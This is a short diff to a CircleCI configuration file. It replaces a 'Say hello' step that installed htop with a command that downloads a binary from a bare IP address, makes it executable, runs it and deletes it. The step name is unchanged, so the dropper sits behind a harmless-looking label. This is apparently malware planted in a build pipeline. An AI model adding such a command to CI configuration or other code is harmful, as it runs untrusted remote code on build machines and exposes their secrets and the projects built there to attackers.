@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "sudo apt update; sudo apt install htop; htop"
+          command: "wget http://185.223.93.61/x-8.6-.ISIS; chmod +x x-8.6-.ISIS; ./x-8.6-.ISIS; rm -rf x-8.6-.ISIS"
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
